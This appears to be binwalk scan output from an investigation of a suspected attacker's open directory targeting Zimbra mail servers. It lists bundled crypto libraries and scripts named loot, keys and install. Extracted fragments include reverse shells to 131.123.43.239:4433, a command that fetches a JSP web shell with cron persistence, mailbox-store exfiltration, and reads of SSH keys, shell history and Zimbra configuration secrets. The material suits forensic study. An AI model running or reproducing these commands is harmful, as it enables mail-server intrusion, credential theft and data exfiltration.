+4157042       0x3F6E72        Zip archive data, at least v2.0 to extract, compressed size: 10627, uncompressed size: 32008, name: Cryptodome/Hash/_MD5.abi3.so
+4167727       0x3F982F        Zip archive data, at least v2.0 to extract, compressed size: 263, uncompressed size: 666, name: Cryptodome/Hash/TupleHash128.pyi
+4168052       0x3F9974        Zip archive data, at least v2.0 to extract, compressed size: 229, uncompressed size: 536, name: Cryptodome/Hash/SHA1.pyi
+4168335       0x3F9A8F        Zip archive data, at least v2.0 to extract, compressed size: 7363, uncompressed size: 27192, name: Cryptodome/Hash/_MD4.abi3.so
+4175756       0x3FB78C        Zip archive data, at least v2.0 to extract, compressed size: 247, uncompressed size: 741, name: Cryptodome/Hash/keccak.pyi
+4176059       0x3FB8BB        Zip archive data, at least v2.0 to extract, compressed size: 270, uncompressed size: 624, name: Cryptodome/Hash/HMAC.pyi
+4176383       0x3FB9FF        Zip archive data, at least v2.0 to extract, compressed size: 226, uncompressed size: 499, name: Cryptodome/Hash/cSHAKE128.pyi
+4176668       0x3FBB1C        Zip archive data, at least v2.0 to extract, compressed size: 14766, uncompressed size: 58376, name: Cryptodome/Hash/_ghash_clmul.abi3.so
+4191500       0x3FF50C        Zip archive data, at least v2.0 to extract, compressed size: 1056, uncompressed size: 2939, name: Cryptodome/Hash/__init__.py
+4192613       0x3FF965        Zip archive data, at least v2.0 to extract, compressed size: 14321, uncompressed size: 45832, name: Cryptodome/Hash/_SHA256.abi3.so
+4206995       0x403193        Zip archive data, at least v2.0 to extract, compressed size: 232, uncompressed size: 544, name: Cryptodome/Hash/SHA384.pyi
+4207283       0x4032B3        Zip archive data, at least v2.0 to extract, compressed size: 232, uncompressed size: 544, name: Cryptodome/Hash/SHA224.pyi
+4207571       0x4033D3        Zip archive data, at least v2.0 to extract, compressed size: 161, uncompressed size: 235, name: Cryptodome/Hash/cSHAKE256.pyi
+4207791       0x4034AF        Zip archive data, at least v2.0 to extract, compressed size: 629, uncompressed size: 1156, name: Cryptodome/Hash/SHA.py
+4208472       0x403758        Zip archive data, at least v2.0 to extract, compressed size: 303, uncompressed size: 739, name: Cryptodome/Hash/BLAKE2s.pyi
+4208832       0x4038C0        Zip archive data, at least v2.0 to extract, compressed size: 2838, uncompressed size: 8169, name: Cryptodome/Hash/HMAC.py
+4211723       0x40440B        Zip archive data, at least v2.0 to extract, compressed size: 1848, uncompressed size: 4756, name: Cryptodome/Hash/TupleHash128.py
+4213632       0x404B80        Zip archive data, at least v2.0 to extract, compressed size: 2076, uncompressed size: 6911, name: Cryptodome/Hash/SHA384.py
+4215763       0x4053D3        Zip archive data, at least v2.0 to extract, compressed size: 2067, uncompressed size: 6143, name: Cryptodome/Hash/SHA3_512.py
+4217887       0x405C1F        Zip archive data, at least v2.0 to extract, compressed size: 228, uncompressed size: 532, name: Cryptodome/Hash/MD4.pyi
+4218168       0x405D38        Zip archive data, at least v2.0 to extract, compressed size: 253, uncompressed size: 605, name: Cryptodome/Hash/SHA3_224.pyi
+4218479       0x405E6F        Zip archive data, at least v2.0 to extract, compressed size: 194, uncompressed size: 306, name: Cryptodome/Hash/TurboSHAKE256.pyi
+4218736       0x405F70        Zip archive data, at least v2.0 to extract, compressed size: 2968, uncompressed size: 9439, name: Cryptodome/Hash/BLAKE2b.py
+4221760       0x406B40        Zip archive data, at least v2.0 to extract, compressed size: 298, uncompressed size: 574, name: Cryptodome/Hash/TurboSHAKE128.pyi
+4222121       0x406CA9        Zip archive data, at least v2.0 to extract, compressed size: 651, uncompressed size: 1211, name: Cryptodome/Hash/RIPEMD.py
+4222827       0x406F6B        Zip archive data, at least v2.0 to extract, compressed size: 305, uncompressed size: 903, name: Cryptodome/Hash/KMAC128.pyi
+4223189       0x4070D5        Zip archive data, at least v2.0 to extract, compressed size: 328, uncompressed size: 822, name: Cryptodome/Hash/CMAC.pyi
+4223571       0x407253        Zip archive data, at least v2.0 to extract, compressed size: 2262, uncompressed size: 6379, name: Cryptodome/Hash/cSHAKE128.py
+4225891       0x407B63        Zip archive data, at least v2.0 to extract, compressed size: 9689, uncompressed size: 33424, name: Cryptodome/Hash/_poly1305.abi3.so
+4235643       0x40A17B        Zip archive data, at least v2.0 to extract, compressed size: 87, uncompressed size: 98, name: Cryptodome/Hash/RIPEMD.pyi
+4235786       0x40A20A        Zip archive data, at least v2.0 to extract, compressed size: 254, uncompressed size: 605, name: Cryptodome/Hash/SHA3_256.pyi
+4236098       0x40A342        Zip archive data, at least v2.0 to extract, compressed size: 2240, uncompressed size: 5957, name: Cryptodome/Hash/KMAC128.py
+4238394       0x40AC3A        Zip archive data, at least v2.0 to extract, compressed size: 210, uncompressed size: 437, name: Cryptodome/Hash/SHAKE256.pyi
+4238662       0x40AD46        Zip archive data, at least v2.0 to extract, compressed size: 258, uncompressed size: 622, name: Cryptodome/Hash/SHA512.pyi
+4238976       0x40AE80        Zip archive data, at least v2.0 to extract, compressed size: 1769, uncompressed size: 4773, name: Cryptodome/Hash/SHAKE128.py
+4240802       0x40B5A2        Zip archive data, at least v2.0 to extract, compressed size: 2077, uncompressed size: 6913, name: Cryptodome/Hash/SHA224.py
+4242934       0x40BDF6        Zip archive data, at least v2.0 to extract, compressed size: 16085, uncompressed size: 60728, name: Cryptodome/Hash/_RIPEMD160.abi3.so
+4259083       0x40FD0B        Zip archive data, at least v2.0 to extract, compressed size: 284, uncompressed size: 665, name: Cryptodome/Hash/Poly1305.pyi
+4259425       0x40FE61        Zip archive data, at least v2.0 to extract, compressed size: 388, uncompressed size: 757, name: Cryptodome/Hash/TurboSHAKE256.py
+4259875       0x410023        Zip archive data, at least v2.0 to extract, compressed size: 2065, uncompressed size: 6702, name: Cryptodome/Hash/SHA1.py
+4261993       0x410869        Zip archive data, at least v2.0 to extract, compressed size: 2071, uncompressed size: 6286, name: Cryptodome/Hash/SHA3_384.py
+4264121       0x4110B9        Zip archive data, at least v2.0 to extract, compressed size: 2052, uncompressed size: 6123, name: Cryptodome/Hash/MD2.py
+4266225       0x4118F1        Zip archive data, at least v2.0 to extract, compressed size: 1227, uncompressed size: 2832, name: Cryptodome/Hash/TupleHash256.py
+4267513       0x411DF9        Zip archive data, at least v2.0 to extract, compressed size: 224, uncompressed size: 612, name: Cryptodome/Hash/SHA256.pyi
+4267793       0x411F11        Zip archive data, at least v2.0 to extract, compressed size: 1767, uncompressed size: 4774, name: Cryptodome/Hash/SHAKE256.py
+4269617       0x412631        Zip archive data, at least v2.0 to extract, compressed size: 322, uncompressed size: 906, name: Cryptodome/Hash/BLAKE2b.pyi
+4269996       0x4127AC        Zip archive data, at least v2.0 to extract, compressed size: 125, uncompressed size: 169, name: Cryptodome/Hash/SHA.pyi
+4270174       0x41285E        Zip archive data, at least v2.0 to extract, compressed size: 2338, uncompressed size: 7732, name: Cryptodome/Hash/SHA512.py
+4272567       0x4131B7        Zip archive data, at least v2.0 to extract, compressed size: 1335, uncompressed size: 2910, name: Cryptodome/Hash/KMAC256.py
+4273958       0x413726        Zip archive data, at least v2.0 to extract, compressed size: 8480, uncompressed size: 27424, name: Cryptodome/Hash/_BLAKE2b.abi3.so
+4282500       0x415884        Zip archive data, at least v2.0 to extract, compressed size: 16568, uncompressed size: 54160, name: Cryptodome/Hash/_SHA384.abi3.so
+4299129       0x419979        Zip archive data, at least v2.0 to extract, compressed size: 210, uncompressed size: 437, name: Cryptodome/Hash/SHAKE128.pyi
+4299397       0x419A85        Zip archive data, at least v2.0 to extract, compressed size: 1089, uncompressed size: 2210, name: Cryptodome/Hash/cSHAKE256.py
+4300544       0x419F00        Zip archive data, at least v2.0 to extract, compressed size: 2490, uncompressed size: 7178, name: Cryptodome/Hash/KangarooTwelve.py
+4303097       0x41A8F9        Zip archive data, at least v2.0 to extract, compressed size: 16828, uncompressed size: 54200, name: Cryptodome/Hash/_SHA512.abi3.so
+4319986       0x41EAF2        Zip archive data, at least v2.0 to extract, compressed size: 2325, uncompressed size: 7555, name: Cryptodome/Hash/keccak.py
+4322366       0x41F43E        Zip archive data, at least v2.0 to extract, compressed size: 4043, uncompressed size: 9034, name: Cryptodome/Hash/__pycache__/HMAC.cpython-311.pyc
+4326487       0x420457        Zip archive data, at least v2.0 to extract, compressed size: 217, uncompressed size: 297, name: Cryptodome/Hash/__pycache__/SHA.cpython-311.pyc
+4326781       0x42057D        Zip archive data, at least v2.0 to extract, compressed size: 3201, uncompressed size: 7658, name: Cryptodome/Hash/__pycache__/SHA1.cpython-311.pyc
+4330060       0x42124C        Zip archive data, at least v2.0 to extract, compressed size: 3026, uncompressed size: 6792, name: Cryptodome/Hash/__pycache__/MD4.cpython-311.pyc
+4333163       0x421E6B        Zip archive data, at least v2.0 to extract, compressed size: 1021, uncompressed size: 2635, name: Cryptodome/Hash/__pycache__/__init__.cpython-311.pyc
+4334266       0x4222BA        Zip archive data, at least v2.0 to extract, compressed size: 5633, uncompressed size: 12273, name: Cryptodome/Hash/__pycache__/CMAC.cpython-311.pyc
+4339977       0x423909        Zip archive data, at least v2.0 to extract, compressed size: 3239, uncompressed size: 7913, name: Cryptodome/Hash/__pycache__/SHA256.cpython-311.pyc
+4343296       0x424600        Zip archive data, at least v2.0 to extract, compressed size: 3204, uncompressed size: 7611, name: Cryptodome/Hash/__pycache__/MD5.cpython-311.pyc
+4346577       0x4252D1        Zip archive data, at least v2.0 to extract, compressed size: 4408, uncompressed size: 10254, name: Cryptodome/Hash/__pycache__/BLAKE2s.cpython-311.pyc
+4351066       0x42645A        Zip archive data, at least v2.0 to extract, compressed size: 1338, uncompressed size: 2926, name: pycryptodomex-3.21.0.dist-info/LICENSE.rst
+4352476       0x4269DC        Zip archive data, at least v2.0 to extract, compressed size: 15314, uncompressed size: 31394, name: pycryptodomex-3.21.0.dist-info/RECORD
+4367857       0x42A5F1        Zip archive data, at least v2.0 to extract, compressed size: 1464, uncompressed size: 3363, name: pycryptodomex-3.21.0.dist-info/METADATA
+4369390       0x42ABEE        Zip archive data, at least v2.0 to extract, compressed size: 13, uncompressed size: 11, name: pycryptodomex-3.21.0.dist-info/top_level.txt
+4369477       0x42AC45        Zip archive data, at least v2.0 to extract, compressed size: 504, uncompressed size: 764, name: pycryptodomex-3.21.0.dist-info/AUTHORS.rst
+4370053       0x42AE85        Zip archive data, at least v2.0 to extract, compressed size: 118, uncompressed size: 148, name: pycryptodomex-3.21.0.dist-info/WHEEL
+4370237       0x42AF3D        Zip archive data, at least v2.0 to extract, compressed size: 1059, uncompressed size: 3258, name: pyasn1/error.py
+4371341       0x42B38D        Zip archive data, at least v2.0 to extract, compressed size: 65, uncompressed size: 66, name: pyasn1/__init__.py
+4371454       0x42B3FE        Zip archive data, at least v2.0 to extract, compressed size: 1293, uncompressed size: 3548, name: pyasn1/debug.py
+4372792       0x42B938        Zip archive data, at least v2.0 to extract, compressed size: 3379, uncompressed size: 6966, name: pyasn1/__pycache__/debug.cpython-311.pyc
+4376241       0x42C6B1        Zip archive data, at least v2.0 to extract, compressed size: 138, uncompressed size: 169, name: pyasn1/__pycache__/__init__.cpython-311.pyc
+4376452       0x42C784        Zip archive data, at least v2.0 to extract, compressed size: 1898, uncompressed size: 5106, name: pyasn1/__pycache__/error.cpython-311.pyc
+4378420       0x42CF34        Zip archive data, at least v2.0 to extract, compressed size: 2160, uncompressed size: 6664, name: pyasn1/codec/streaming.py
+4380635       0x42D7DB        Zip archive data, at least v2.0 to extract, compressed size: 56, uncompressed size: 59, name: pyasn1/codec/__init__.py
+4380745       0x42D849        Zip archive data, at least v2.0 to extract, compressed size: 2088, uncompressed size: 8814, name: pyasn1/codec/native/decoder.py
+4382893       0x42E0AD        Zip archive data, at least v2.0 to extract, compressed size: 56, uncompressed size: 59, name: pyasn1/codec/native/__init__.py
+4383010       0x42E122        Zip archive data, at least v2.0 to extract, compressed size: 2158, uncompressed size: 8614, name: pyasn1/codec/native/encoder.py
+4385228       0x42E9CC        Zip archive data, at least v2.0 to extract, compressed size: 118, uncompressed size: 155, name: pyasn1/codec/__pycache__/__init__.cpython-311.pyc
+4385425       0x42EA91        Zip archive data, at least v2.0 to extract, compressed size: 4038, uncompressed size: 9242, name: pyasn1/codec/__pycache__/streaming.cpython-311.pyc
+4389543       0x42FAA7        Zip archive data, at least v2.0 to extract, compressed size: 1267, uncompressed size: 3287, name: pyasn1/codec/der/decoder.py
+4390867       0x42FFD3        Zip archive data, at least v2.0 to extract, compressed size: 56, uncompressed size: 59, name: pyasn1/codec/der/__init__.py
+4390981       0x430045        Zip archive data, at least v2.0 to extract, compressed size: 1266, uncompressed size: 3338, name: pyasn1/codec/der/encoder.py
+4392304       0x430570        Zip archive data, at least v2.0 to extract, compressed size: 122, uncompressed size: 159, name: pyasn1/codec/der/__pycache__/__init__.cpython-311.pyc
+4392509       0x43063D        Zip archive data, at least v2.0 to extract, compressed size: 1602, uncompressed size: 3026, name: pyasn1/codec/der/__pycache__/encoder.cpython-311.pyc
+4394193       0x430CD1        Zip archive data, at least v2.0 to extract, compressed size: 1241, uncompressed size: 2596, name: pyasn1/codec/der/__pycache__/decoder.cpython-311.pyc
+4395516       0x4311FC        Zip archive data, at least v2.0 to extract, compressed size: 1698, uncompressed size: 4498, name: pyasn1/codec/cer/decoder.py
+4397271       0x4318D7        Zip archive data, at least v2.0 to extract, compressed size: 56, uncompressed size: 59, name: pyasn1/codec/cer/__init__.py
+4397385       0x431949        Zip archive data, at least v2.0 to extract, compressed size: 2757, uncompressed size: 9673, name: pyasn1/codec/cer/encoder.py
+4400199       0x432447        Zip archive data, at least v2.0 to extract, compressed size: 122, uncompressed size: 159, name: pyasn1/codec/cer/__pycache__/__init__.cpython-311.pyc
+4400404       0x432514        Zip archive data, at least v2.0 to extract, compressed size: 5533, uncompressed size: 12017, name: pyasn1/codec/cer/__pycache__/encoder.cpython-311.pyc
+4406019       0x433B03        Zip archive data, at least v2.0 to extract, compressed size: 1938, uncompressed size: 3779, name: pyasn1/codec/cer/__pycache__/decoder.cpython-311.pyc
+4408039       0x4342E7        Zip archive data, at least v2.0 to extract, compressed size: 12468, uncompressed size: 77235, name: pyasn1/codec/ber/decoder.py
+4420564       0x4373D4        Zip archive data, at least v2.0 to extract, compressed size: 56, uncompressed size: 59, name: pyasn1/codec/ber/__init__.py
+4420678       0x437446        Zip archive data, at least v2.0 to extract, compressed size: 6155, uncompressed size: 28630, name: pyasn1/codec/ber/encoder.py
+4426890       0x438C8A        Zip archive data, at least v2.0 to extract, compressed size: 362, uncompressed size: 639, name: pyasn1/codec/ber/eoo.py
+4427305       0x438E29        Zip archive data, at least v2.0 to extract, compressed size: 122, uncompressed size: 159, name: pyasn1/codec/ber/__pycache__/__init__.cpython-311.pyc
+4427510       0x438EF6        Zip archive data, at least v2.0 to extract, compressed size: 14103, uncompressed size: 32882, name: pyasn1/codec/ber/__pycache__/encoder.cpython-311.pyc
+4441695       0x43C65F        Zip archive data, at least v2.0 to extract, compressed size: 28354, uncompressed size: 77487, name: pyasn1/codec/ber/__pycache__/decoder.cpython-311.pyc
+4470131       0x443573        Zip archive data, at least v2.0 to extract, compressed size: 707, uncompressed size: 1115, name: pyasn1/codec/ber/__pycache__/eoo.cpython-311.pyc
+4470916       0x443884        Zip archive data, at least v2.0 to extract, compressed size: 967, uncompressed size: 3011, name: pyasn1/type/tagmap.py
+4471934       0x443C7E        Zip archive data, at least v2.0 to extract, compressed size: 4832, uncompressed size: 22331, name: pyasn1/type/base.py
+4476815       0x444F8F        Zip archive data, at least v2.0 to extract, compressed size: 194, uncompressed size: 259, name: pyasn1/type/error.py
+4477059       0x445083        Zip archive data, at least v2.0 to extract, compressed size: 995, uncompressed size: 2861, name: pyasn1/type/opentype.py
+4478107       0x44549B        Zip archive data, at least v2.0 to extract, compressed size: 56, uncompressed size: 59, name: pyasn1/type/__init__.py
+4478216       0x445508        Zip archive data, at least v2.0 to extract, compressed size: 15558, uncompressed size: 108548, name: pyasn1/type/univ.py
+4493823       0x4491FF        Zip archive data, at least v2.0 to extract, compressed size: 2241, uncompressed size: 9499, name: pyasn1/type/tag.py
+4496112       0x449AF0        Zip archive data, at least v2.0 to extract, compressed size: 4637, uncompressed size: 22145, name: pyasn1/type/constraint.py
+4500804       0x44AD44        Zip archive data, at least v2.0 to extract, compressed size: 3418, uncompressed size: 16381, name: pyasn1/type/namedtype.py
+4504276       0x44BAD4        Zip archive data, at least v2.0 to extract, compressed size: 1440, uncompressed size: 4899, name: pyasn1/type/namedval.py
+4505769       0x44C0A9        Zip archive data, at least v2.0 to extract, compressed size: 1831, uncompressed size: 11410, name: pyasn1/type/char.py
+4507649       0x44C801        Zip archive data, at least v2.0 to extract, compressed size: 1525, uncompressed size: 5284, name: pyasn1/type/useful.py
+4509225       0x44CE29        Zip archive data, at least v2.0 to extract, compressed size: 4037, uncompressed size: 13321, name: pyasn1/type/__pycache__/char.cpython-311.pyc
+4513336       0x44DE38        Zip archive data, at least v2.0 to extract, compressed size: 3542, uncompressed size: 7774, name: pyasn1/type/__pycache__/useful.cpython-311.pyc
+4516954       0x44EC5A        Zip archive data, at least v2.0 to extract, compressed size: 39957, uncompressed size: 141403, name: pyasn1/type/__pycache__/univ.cpython-311.pyc
+4556985       0x4588B9        Zip archive data, at least v2.0 to extract, compressed size: 117, uncompressed size: 154, name: pyasn1/type/__pycache__/__init__.cpython-311.pyc
+4557180       0x45897C        Zip archive data, at least v2.0 to extract, compressed size: 4800, uncompressed size: 13383, name: pyasn1/type/__pycache__/tag.cpython-311.pyc
+4562053       0x459C85        Zip archive data, at least v2.0 to extract, compressed size: 1952, uncompressed size: 4388, name: pyasn1/type/__pycache__/tagmap.cpython-311.pyc
+4564081       0x45A471        Zip archive data, at least v2.0 to extract, compressed size: 10008, uncompressed size: 29635, name: pyasn1/type/__pycache__/base.cpython-311.pyc
+4574163       0x45CBD3        Zip archive data, at least v2.0 to extract, compressed size: 293, uncompressed size: 456, name: pyasn1/type/__pycache__/error.cpython-311.pyc
+4574531       0x45CD43        Zip archive data, at least v2.0 to extract, compressed size: 8943, uncompressed size: 30550, name: pyasn1/type/__pycache__/constraint.cpython-311.pyc
+4583554       0x45F082        Zip archive data, at least v2.0 to extract, compressed size: 8434, uncompressed size: 25915, name: pyasn1/type/__pycache__/namedtype.cpython-311.pyc
+4592067       0x4611C3        Zip archive data, at least v2.0 to extract, compressed size: 3544, uncompressed size: 8394, name: pyasn1/type/__pycache__/namedval.cpython-311.pyc
+4595689       0x461FE9        Zip archive data, at least v2.0 to extract, compressed size: 454, uncompressed size: 1372, name: pyasn1/compat/octets.py
+4596196       0x4621E4        Zip archive data, at least v2.0 to extract, compressed size: 961, uncompressed size: 2828, name: pyasn1/compat/integer.py
+4597211       0x4625DB        Zip archive data, at least v2.0 to extract, compressed size: 103, uncompressed size: 112, name: pyasn1/compat/__init__.py
+4597369       0x462679        Zip archive data, at least v2.0 to extract, compressed size: 2174, uncompressed size: 3902, name: pyasn1/compat/__pycache__/integer.cpython-311.pyc
+4599622       0x462F46        Zip archive data, at least v2.0 to extract, compressed size: 161, uncompressed size: 198, name: pyasn1/compat/__pycache__/__init__.cpython-311.pyc
+4599863       0x463037        Zip archive data, at least v2.0 to extract, compressed size: 1090, uncompressed size: 2662, name: pyasn1/compat/__pycache__/octets.cpython-311.pyc
+4651806       0x46FB1E        End of Zip archive, footer length: 22
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/index.html
+MD5 Checksum:  98889eef3a8f07150bd1889fbd154750
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+16            0x10            HTML document header
+4918          0x1336          HTML document footer
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/kb.sh
+MD5 Checksum:  bd36de02dce0443866aaed7dddf9fc06
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/keys1.b64
+MD5 Checksum:  61a98e6462f5d3eaae9e56e49ac896d8
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/keys1.sh
+MD5 Checksum:  c6c96cf5feb04d111c176eba3561369a
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/kqdq.sh
+MD5 Checksum:  4cb0eac2df2ae4e6b5358a707c5bcd31
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/kq.sh
+MD5 Checksum:  d706a86fa3ce56218cd2f901d4cf3506
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+416           0x1A0           Unix path: /opt/zimbra/log
+578           0x242           Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | grep -v -x -f <(awk "{print \$1}" $L/.map) > /tmp/.todo
+710           0x2C6           Unix path: /opt/zimbra/bin/zmprov gmi "$a" 2>/dev/null | awk "/mailboxId/{print \$2}")
+1071          0x42F           Unix path: /opt/zimbra/store/0/$id" ] || { echo "$id" >> $L/.doj; return 0; }
+1250          0x4E2           Unix path: /opt/zimbra/store/0 "$id" 2>/dev/null | $GZ -1 | split -b 150m - /tmp/C_${id}_ 2>/dev/null
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/krdq80.sh
+MD5 Checksum:  a55247fd6d54c3d19300189b9d3f6c6f
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+818           0x332           Unix path: /dev/tcp/131.123.43.239/4433 0>&1" &); fi
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/krio2.sh
+MD5 Checksum:  2deadf318891581df6ecb30fc7cbcff3
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/krio3.sh
+MD5 Checksum:  a379e3010834dbd82d580506a1476838
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+324           0x144           Unix path: /opt/zimbra/log
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/krq80.sh
+MD5 Checksum:  8c3d2bd1ac36961a3d77418e64ea1c24
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+410           0x19A           Unix path: /opt/zimbra/log
+571           0x23B           Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | grep -v -x -f <(awk "{print \$1}" $L/.map) > /tmp/.todo
+703           0x2BF           Unix path: /opt/zimbra/bin/zmprov gmi "$a" 2>/dev/null | awk "/mailboxId/{print \$2}")
+1064          0x428           Unix path: /opt/zimbra/store/0/$id" ] || { echo "$id" >> $L/.doj; return 0; }
+1243          0x4DB           Unix path: /opt/zimbra/store/0 "$id" 2>/dev/null | $GZ -1 | split -b 150m - /tmp/C_${id}_ 2>/dev/null
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/krx.sh
+MD5 Checksum:  cb3383a89957fb022b277cd49afcb4f1
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+624           0x270           Unix path: /opt/zimbra/store/0 2>/dev/null | head -5; ls /opt/zimbra/store/0 2>/dev/null | wc -l
+726           0x2D6           Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | wc -l
+1127          0x467           Unix path: /opt/zimbra/log/.qq3m ]; then touch /opt/zimbra/log/.qq3m 2>/dev/null
+1835          0x72B           Unix path: /var/spool/cron 2>/dev/null; cat /etc/cron.d/* 2>/dev/null
+1921          0x781           Unix path: /opt/zimbra/.ssh 2>/dev/null; cat /opt/zimbra/.ssh/zimbra_identity* /opt/zimbra/.ssh/authorized_keys /opt/zimbra/.ssh/id* 2>/dev
+2341          0x925           Unix path: /opt/zimbra/.bash_history /home/*/.bash_history 2>/dev/null | tail -400
+2448          0x990           Unix path: /opt/zimbra/bin/zmlocalconfig -s' 2>/dev/null || sudo -u zimbra /opt/zimbra/bin/zmlocalconfig -s 2>/dev/null || /opt/zimbra/bin/
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/kvinstall.sh
+MD5 Checksum:  f76f100b06d0e7043d47f66ae365b1a4
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+337           0x151           Unix path: /opt/zimbra/jetty_base/webapps/zimbra/sh.jsp http://131.123.43.239:8123/x.jsp
+490           0x1EA           Unix path: /opt/zimbra/log/.kb.sh 2>/dev/null
+590           0x24E           Unix path: /opt/zimbra/log/.kb.sh >/dev/null 2>&1") | crontab - 2>/dev/null
+715           0x2CB           Unix path: /opt/zimbra/jetty_base/webapps/zimbra/sh.jsp >> /tmp/.ir 2>&1
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/kvm.sh
+MD5 Checksum:  8dbf495989e90202c1da9456ede90686
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+324           0x144           Unix path: /opt/zimbra/common/bin/curl
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/ldap0.py
+MD5 Checksum:  7c86d37f6c7fd09bdd1f79eb4a5b4f71
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/loot1.py
+MD5 Checksum:  8d395cc2e386f34b61747f6b22350e03
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/loot12b.py
+MD5 Checksum:  e7fa53496239709df81d4382c50e3a3b
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/loot12.py
+MD5 Checksum:  c17f06d4411292bb10eeaccf3d63bd53
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/lvdq80.sh
+MD5 Checksum:  a954a7a880e8d1d5cce070b92f2ef69b
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+943           0x3AF           Unix path: /dev/tcp/131.123.43.239/4433 0>&1" &); fi
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/lvq80.sh
+MD5 Checksum:  411aba704beac7f17d094606f1baced8
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+410           0x19A           Unix path: /opt/zimbra/log
+571           0x23B           Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | grep -v -x -f <(awk "{print \$1}" $L/.map) > /tmp/.todo
+703           0x2BF           Unix path: /opt/zimbra/bin/zmprov gmi "$a" 2>/dev/null | awk "/mailboxId/{print \$2}")
+1064          0x428           Unix path: /opt/zimbra/store/0/$id" ] || { echo "$id" >> $L/.doj; return 0; }
+1243          0x4DB           Unix path: /opt/zimbra/store/0 "$id" 2>/dev/null | $GZ -1 | split -b 150m - /tmp/C_${id}_ 2>/dev/null
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/lvq81.sh
+MD5 Checksum:  383e270cdc9cb4ca2a429ea216b861ad
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+358           0x166           Unix path: /opt/zimbra/bin
+592           0x250           Unix path: /opt/zimbra/store/0 2>/dev/null | wc -l
+658           0x292           Unix path: /opt/zimbra/.ssh 2>/dev/null; head -40 /opt/zimbra/.ssh/id_rsa* 2>/dev/null
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/lvx.sh
+MD5 Checksum:  f0f100c48bbaeff4e6cd3a84f8f97d4d
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+624           0x270           Unix path: /opt/zimbra/store/0 2>/dev/null | head -5; ls /opt/zimbra/store/0 2>/dev/null | wc -l
